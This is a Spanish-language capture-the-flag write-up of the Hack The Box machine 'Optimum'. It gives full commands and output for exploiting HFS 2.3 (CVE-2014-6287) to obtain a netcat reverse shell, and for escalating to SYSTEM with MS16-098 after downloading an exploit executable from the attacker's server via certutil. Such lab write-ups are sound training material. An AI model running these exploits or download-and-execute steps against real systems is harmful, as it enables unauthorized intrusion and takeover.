---
layout: single
title: Optimum - Hack The Box
excerpt: "La máquina Optimum, bastante sencilla con muchas formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario y aunque intente probar otro exploit (MS16-032) para escalar privilegios como Root, no funciono, hay más por probar pues el que si sirvio fue el MS16-098."
date: 2023-02-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-optimum/optimum_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - Http File Server (HFS)
  - Remote Command Execution (RCE) - CVE-2014-6287
  - Windows Exploit Suggester
  - Local Privilege Escalation - MS16-098
  - OSCP Style
---
![](/assets/images/htb-writeup-optimum/optimum_logo.png)
La máquina Optimum, bastante sencilla con muchas formas para poder vulnerarla, en mi caso use el CVE-2014-6287 para poder acceder a la máquina como usuario y aunque intente probar otro exploit (MS16-032) para escalar privilegios como Root, no funciono, hay más por probar pues el que si sirvio fue el MS16-098.

## Traza ICMP
Realicemos un ping para saber si la máquina esta conectada y analizaremos el TTL para saber que SO opera en dicha máquina.
```
ping -c 4 10.10.10.8       
PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=137 ms
64 bytes from 10.10.10.8: icmp_seq=2 ttl=127 time=136 ms
64 bytes from 10.10.10.8: icmp_seq=3 ttl=127 time=137 ms
64 bytes from 10.10.10.8: icmp_seq=4 ttl=127 time=138 ms

--- 10.10.10.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 136.461/137.143/137.939/0.526 ms
```
Gracias al TTL sabemos que la máquina usa Windows. Realicemos los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 13:28 CST
Initiating SYN Stealth Scan at 13:28
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
Completed SYN Stealth Scan at 13:28, 26.96s elapsed (65535 total ports)
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.32s latency).
Scanned at 2023-03-30 13:28:24 CST for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.03 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 23 (1.012KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Al parecer, solamente hay un puerto abierto y es el de http. En vez de realizar un escaneo de servicios podriamos usar **whatweb** para saber más sobre dicho puerto pero hagamoslo namas por costumbre.

## Escaneo de Servicios
```
nmap -sC -sV -p80 10.10.10.8 -oN targeted                                            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 13:31 CST
Nmap scan report for 10.10.10.8
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Muy bien, podemos ver la versión de http que usan, pero igual usemos **whatweb** para ver que nos dice:
```
whatweb http://10.10.10.8/                                                                                              
http://10.10.10.8/ [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```
Pues practicamente lo mismo. Es momento de analizar el puerto http.

## Analizando Puerto 80
Vamos a entrar a ver que show:

![](/assets/images/htb-writeup-optimum/Captura1.png)

Mmmmm no habia visto algo parecido, pareciera como si ya estuvieramos dentro pero no, si nos vamos a login nos pedira credenciales que obviamente no tenemos:

![](/assets/images/htb-writeup-optimum/Captura2.png)

Se podra subir archivos? Al parecer no todavia, ahi mismo nos aparece la información del servidor que ya nos dio el escaneo de servicios y whatweb:

![](/assets/images/htb-writeup-optimum/Captura3.png)

Vamos a investigar que es este servicio:
**HTTP File Server es una herramienta simple que le permite acceder a los archivos de su teléfono desde una computadora de escritorio, tableta u otros dispositivos sin ningún software especial, solo un navegador web.**

**HTTP File Server muestra los archivos compartidos en una sencilla página HTML, en la que se incluye el nombre de cada archivo y su tamaño.**

Entonces el servicio que esta operando, es el **HFS 2.3**. Es momento de buscar un exploit.

## Buscando un Exploit
```
searchsploit HFS 2.3                 
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                     | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                             | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                        | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                        | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                   | windows/webapps/34852.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Ufff, hay varios que podemos probar y que justo son RCE, empecemos con los .py primero:

### Probando Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
```
searchsploit -x windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
```
Ok, el exploit nos dice algo importante:

**Debe estar utilizando un servidor web que aloje netcat (http://attackers_ip:80/nc.exe) y ¡Es posible que deba ejecutarlo varias veces para tener éxito!**

Entonces debemos subir una netcat como con otras máquinas para que este exploit pueda funcionar. Vamos a copiar el exploit antes que nada:
```
searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
```
Ahora si, hagamoslo por pasos:

* Para empezar busquemos la netcat, si tienes Kali ya sabras como:
```
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
```
* Copiamos la de binarios:
```
cp /usr/share/windows-resources/binaries/nc.exe .
ls           
allPorts  HFS_Exploit.py  nc.exe  targeted
```
* Antes de levantar el servidor para cargar la netcat, hay que cambiar estas dos variables del exploit:
```
	ip_addr = "Tu_IP" #local IP address
        local_port = "443" # Local Port number
```
* Ahora si, activamos el servidor:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* Activamos una netcat con el puerto que pusimos:
```
nc -nvlp 443                       
listening on [any] 443 ...
```
* Y lanzamos el exploit, como bien menciona hay que activarlo varias veces, en mi caso funciono a la segunda:
```
python2 HFS_Exploit.py 10.10.10.8 80
```
* Listo, ya estamos dentro:
```
nc -nvlp 443                       
listening on [any] 443 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.8] 49162
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```
Justamente entramos como un usuario y en su escritorio, entonces ahi mismo esta la flag del usuario:
```
C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D
 Directory of C:\Users\kostas\Desktop
06/04/2023  07:25 ��    <DIR>          .
06/04/2023  07:25 ��    <DIR>          ..
18/03/2017  03:11 ��           760.320 hfs.exe
06/04/2023  07:24 ��                34 user.txt
               2 File(s)        760.354 bytes
               2 Dir(s)   5.673.574.400 bytes free
C:\Users\kostas\Desktop>type user.txt
type user.txt
34cbd67f90f2fa85416b39f6fb55cfbc
```

Ahora que hacemos? Bueno, veamos que permisos tenemos y quiza con eso podamos convertirnos en Root o en este caso como NT Authority System.
```
C:\Users\kostas\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
No estoy del todo seguro de que podamos aprovecharnos de ese privilegio, asi que mejor veamos que version de windows corre la máquina:
```
C:\Users\kostas\Desktop>systeminfo 
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
```
La máquina usa **Windows 2012 6.3.9600 N/A Build 9600**, busquemos un exploit para este. Pero mejor usemos una herramienta muy util para estos casos.

La herramienta **Windows Exploit Suggester** nos va a ayudar a encontrar los exploits a los que es vulnerable la maquina, unicamente debemos pasarle un fichero que almacene toda la información que nos de el comando **systeminfo** de la máquina victima, primero vamos a descargar esta herramienta:

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

```
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
Clonando en 'Windows-Exploit-Suggester'...
remote: Enumerating objects: 120, done.
remote: Counting objects: 100% (67/67), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 120 (delta 58), reused 54 (delta 54), pack-reused 53
Recibiendo objetos: 100% (120/120), 156.83 KiB | 1.15 MiB/s, listo.
Resolviendo deltas: 100% (74/74), listo.
```
Una vez descargada solamente seguimos las instrucciones del github o si no te funciona, hazle como yo:
```
python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2023-03-30-mssb.xls
[*] done
```
Al hacer esto, nos da un archivo que necesitaremos usar junto al archivo donde esta la info del sistema, de hecho ahi te dice que creo un archiv: **writing to file 2023-03-30-mssb.xls**

Vamos a copiar toda la info que nos dio el comando **systeminfo** y la guardaremos en un fichero con el mismo nombre o uno similar:
```
nano sysinfo.txt
ls                                           
2023-03-30-mssb.xls  LICENSE.md  README.md  sysinfo.txt  windows-exploit-suggester.py
```
Corremos el suggester y nos saldran varios exploits para esta máquina. IMPORTANTE, a la primera no me sirvio, por lo que tuve que instalar otra cosa:
```
pip2 install xlrd==1.2.0
```
Aqui viene ese problema:

https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/

Ahora si, usemos el suggester:
```
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
...
```
Puedes intentar probar con varios, yo en especial voy a probar con el **MS16-098** porque intente probar el **MS16-032** pero no me funciono, casi 3 horas perdidas ahi jeje.

## Post Explotación
```
searchsploit MS16-098                  
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)                                         | windows_x86-64/local/41020.c
Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) (2)                                       | windows_x86-64/local/42435.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
El exploit esta hecho en C, si analizamos el contenido del exploit, arriba vienen adjuntos dos links, uno con información y otro con el que podremos descargar un ejecutable de dicho exploit, descargalo.

Despues de descargarlo, vamos a meterlo a la maquina, para esto usaremos un programa llamado **certutil.exe**, dicho programa esta en todos los windows y con este podemos descargar directamente cualquier cosa. Investiguemos sobre **certutil**.

**Una de las características de CertUtil es la capacidad de descargar un certificado, o cualquier otro archivo para ese asunto, desde una URL remota y guardarlo como un archivo local usando la sintaxis "certutil.exe -urlcache -split -f [URL] output.file".** 

Aqui un link con esta info:

https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/

Entonces vamos a usar el siguiente comando dentro de la maquina:
```
certutil.exe -urlcache -split -f [URL] nombre_con_el_que_se_guardara
```
Muy bien, hagamoslo por pasos:
* Levantamos un servidor con python en donde este el exploit ejecutable:
```
python3 -m http.server                                                            
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Nos metemos a la carpeta /Temp y creamos un directorio, lo llamaremos privesc:
```
C:\Users\kostas\Desktop>cd C:\Windows/Temp
mkdir Privesc
cd Privesc
```
* Y dentro de la máquina usamos el sig. comando de certutil.exe:
```
C:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
certutil.exe -urlcache -split -f http://10.10.14.12:8000/Exploit.exe Exploit.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.
```
* Verificamos si esta el exploit, aunque igual se puede ver en el servidor que activamos:
```
C:\Windows\Temp\Privesc>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D
 Directory of C:\Windows\Temp\Privesc
06/04/2023  04:44 ��    <DIR>          .
06/04/2023  04:44 ��    <DIR>          ..
06/04/2023  04:44 ��           560.128 Exploit.exe
               1 File(s)        560.128 bytes
               2 Dir(s)   5.652.480.000 bytes free
```
* Y lo activamos:
```
C:\Windows\Temp\Privesc>Exploit.exe
Exploit.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Windows\Temp\Privesc>whoami
whoami
nt authority\system
```
LISTO!, ya entramos, solamente busca la flag en el directorio Administrator.

## Links de Investigación
* https://www.google.com/search?client=firefox-b-e&q=HFS+2.3+exploit
* https://www.exploit-db.com/exploits/39161
* https://github.com/FuzzySecurity/PowerShell-Suite
* https://github.com/sensepost/ms16-098
* https://rednode.com/privilege-escalation/windows-privilege-escalation-cheat-sheet/ 
* https://github.com/AonCyberLabs/Windows-Exploit-Suggester
* https://www.aon.com/cyber-solutions/aon_cyber_labs/introducing-windows-exploit-suggester/
* https://www.reddit.com/r/learnpython/comments/ft0h3p/windowsexploitsuggester_error/
* https://tecnonucleous.com/2018/04/05/certutil-exe-podria-permitir-que-los-atacantes-descarguen-malware-mientras-pasan-por-alto-el-antivirus/

# FIN
